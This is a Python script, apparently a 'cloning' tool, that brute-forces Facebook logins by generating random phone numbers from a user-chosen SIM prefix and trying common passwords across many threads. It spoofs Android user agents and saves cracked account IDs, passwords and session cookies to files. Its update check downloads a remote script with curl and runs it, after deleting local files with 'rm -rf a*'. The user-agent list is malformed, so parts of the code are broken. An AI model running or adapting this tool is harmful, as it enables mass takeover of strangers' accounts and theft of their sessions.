#coding=utf

#YE LOL PE CHART TA 
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

uaku2=[]
ugen2=[]
ugen=[]


for xd in range(10000):
    aa='Dalvik/2.1.0 (Linux; U; Android 7.1.2; TA-1033 Build/N2G47H)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; E5823 Build/32.4.A.1.54)","Dalvik/2.1.0 (Linux; U; Android 7.0; HT50 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900FD Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo A2010-a Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G965F Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J727V Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X MIUI/V9.5.4.0.NAMMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G920F Build/LMY47X)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo TB2-X30L Build/LenovoTB2-X30L)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V9.5.1.0.MBFMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320FN Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J530F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Tasty Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo P1ma40 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIT-L01 Build/HONORTIT-L01)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.1.6.0.MBFMIDI)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920K Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; ONEPLUS A5000 Build/OPM1.171019.011)","Dalvik/2.1.0 (Linux; U; Android 6.0; MotoG3 Build/MPIS24.65-33.1-2-16)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 3 MIUI/V8.2.2.0.MHOMIDL)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; HTC One_M8 Eye Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z010D Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4A MIUI/V9.2.6.0.NCCMIEK)","Dalvik/2.1.0 (Linux; U; Android 5.1; K4000_PRO Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.5.6.0.MBFMIED)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A510F Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; LGLS665 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; Moto G (4) Build/NPJS25.93-14-4)","Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 4 MIUI/8.4.19)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A510F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1; T03 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J111F Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0; LEAGOO M8 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.0; KOB-L09 Build/HUAWEIKOB-L09)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N920T Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo TB3-710I Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; Moto G (5S) Plus Build/NPSS26.116-61-5)","Dalvik/2.1.0 (Linux; U; Android 6.0; LG-K430 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0; BV7000 PRO Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532F Build/MMB29T)","Dalvik/2.1.0 (Linux; U; Android 5.1; AP-107G Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 6.0; ZTE BLADE A610C Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; MIX 2S MIUI/V9.5.15.0.ODGCNFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22)","Dalvik/2.1.0 (Linux; U; Android 7.0; DLI-TL20 Build/HONORDLI-TL20)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi 3S MIUI/V9.5.5.0.MALMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-D724 Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900F Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; T5c Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J200H Build/LMY48B)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; D6503 Build/23.5.A.0.575)","Dalvik/2.1.0 (Linux; U; Android 5.0.1; Lenovo TB3-710F Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; NEXBOX-A95X Build/NEXBOX-A95X-RTL8723BS)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; LS-4505 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G390F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.0; FRD-L19 Build/HUAWEIFRD-L19)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G920F Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 5.0; LEO_DG280 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X MIUI/V9.5.5.0.NAMMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; HUAWEI CRR-L09 Build/HUAWEICRR-L09)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; SM-T350 Build/NMF26X)","Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Lenovo TB2-X30L Build/LenovoTB2-X30L)","Dalvik/2.1.0 (Linux; U; Android 6.0; Tele2_Mini_1.1 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo A1010a20 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N9200 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; Aquaris X Build/NMF26F)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J710GN Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 5.0; SM-N9005 Build/LRX21V)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G955F Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900I Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T700 Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SAMSUNG-SM-G930A Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-C5000 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.0; XT1575 Build/NPHS25.200-23-1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A310F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.0; HTC_0PJA10 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; SM-T535 Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; XT1609 Build/NPIS26.48-38-3)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J530Y Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; XT1635-01 Build/NDNS26.118-23-12-7-4)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N920V Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320FL Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; LG-M154 Build/MXB48T)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950F Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; Nexus 6 Build/NGI77B)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A2020a40 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi Note 5A MIUI/V9.2.5.0.NDFMIEK)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A720F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J710F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 6.0; PMT3131_3G Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 5.1; T02 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a40 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 5.0; Tab2A7-10F Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; SM-J510H Build/NMF26X)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T715Y Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo TB2-X30F Build/LenovoTB2-X30F)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo YT3-850L Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 3 MIUI/V9.5.3.0.MHOMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-D618 Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 6.0; Micromax Q350 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0; Joy Pro Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; HTC One Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 7.0; HUAWEI VNS-L21 Build/HUAWEIVNS-L21)","Dalvik/2.1.0 (Linux; U; Android 5.1; m2 note Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-N950U1 Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; MI MAX 2 MIUI/V9.5.4.0.NDDMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320H Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T825 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; SM-T355 Build/NMF26X)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi 4 MIUI/V8.0.3.0.0.MCECNDG)",

logo = """
         \033[1;37m ######     ###    ##    ##    ###    
         \033[1;37m##    ##   ## ##   ###   ##   ## ##   
         \033[1;37m##        ##   ##  ####  ##  ##   ##  
         \033[1;37m ######  ##     ## ## ## ## ##     ## 
         \033[1;37m      ## ######### ##  #### ######### 
         \033[1;37m##    ## ##     ## ##   ### ##     ## 
         \033[1;37m ######  ##     ## ##    ## ##     ## \033[1;32m LPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mSANA\033[1;37m
[•] STATUS     : \033[1;32mFREE\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
--------------------------------------------------"""

def lines():
	print('\33[1;37m--------------------------------------------------')
loop = 0
oks = []
cps = []
try:
    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def rehan():
	os.system('clear')
	print(logo)
	print('[1] RANDOM PAK CLONING')
	print('[2] RANDOM BD CLONING')
	print('[3] RANDOM CHOICE PASS CLONING')
	print('[4] CONTACT WITH OWNER')
	print('[0] EXIT')
	lines()
	gh = input('[•] CHOOSE : ')
	if gh =='1':
		menu()
	elif gh =='2':
		bd()
	elif gh =='3':
		chos()
	elif gh =='4':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100012510726200')
	elif gh =='0':
		print('[•] THANKS FOR USE ')
		time.sleep(3)
		exit()
	else:
		print('[•] CHOOSE CORRECT OPTION')
		time.sleep(2)
		rehan()

def menu():
	os.system('clear')
	print(logo)
	print('[1] LAST 7 DIGIT')
	print('[2] ALI + KHAN PASS')
	print('[3] MALIK + BALOCH PASS')
	print('[4] BEST FOR PUBG IDS')
	print('[5] BEST FOR FREE FIRE IDS')
	print('[0] EXIT TO MAIN MENU')
	lines()
	opt = input('[•] CHOOSE: ')
	if opt =='1':
		svn_digit()
	elif opt =='2':
		ali_khan()
	elif opt =='3':
		malik_baloch()
	elif opt =='4':
		pubg()
	elif opt =='5':
		ff()
	elif opt =='0':
		rehan()
	else:
		print('\n\033[1;37m[•] Choose valid option\033[0;97m')
		time.sleep(2)
		menu()

#____

def svn_digit():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru]
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
	rehan()

#____

def ali_khan():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
	rehan()

#____________





#_______

def malik_baloch():
	user=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=60) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'malik123','malik1122','baloch786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
	rehan()

#____

def pubg():
	user=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'pubgqueen','pubgking','pubglover']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
	rehan()

#____

def ff():
	user=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'freefire','fflover','ffking','ffqueen']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
	rehan()

#___________

def bd():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE : 088***,88***,88****,88****,.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mBANGLA')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'+88','bangladish']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
	rehan()

def chos():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\x1b[1;91m[•] YOUR SIM CODE: ')
    lines()
    code = input(' Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[•] MAX LIMIT [50000]')
    lines()
    limit = int(input('[•] LIMIT :  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
    lines()
    passx = int(input("[•] ENTER PASSWORD LIMIT : "))
    HamiiID = []
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
    lines()
    for bilal in range(passx):
        pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=70) as manshera:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        lines()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(fcrack,uid,pwx,tl)
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    rehan()
#_____
def fcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',

			'upgrade-insecure-requests': '1',

			'viewport-width': '980',

			'method': 'path',

			'scheme': 'https',

			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 

			'dnt':'1', 

			'x-requested-with':'mark.via.gp', 

			'sec-fetch-site': 'none',

			'sec-fetch-mode': 'navigate',

			'sec-fetch-user': '?1',

			'sec-fetch-dest': 'document',

			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',

			'cache-control': 'max-age=0',

			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',

			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',

			"sec-ch-prefers-color-scheme": "light",

			'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[SANA-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('LPC-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[SANA-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('LPC-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSANA\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)

  try:
    httpCaht = requests.get('https://github.com/Kaptan302/Apr/blob/main/Apr.txt').text
    if id in httpCaht:
      print("\33[1;32mYOUR KEY IS APPROVED.")
      msg = str(os.geteuid())
      time.sleep(0.5)
      rehan()
      pass
    else:
      print("YOUR KEY : "+id)
      print('\33[1;37m----------------------------------------------')
      print("\33[1;32mNOTE:")
      print("\33[1;37m----------------------------------------------")
      print("\33[1;37mTOOL IS FREE BUT YOU HAVE TO\nGET APPROVAL FIRST.")
      print('\33[1;37m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923498410573?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()

rehan()
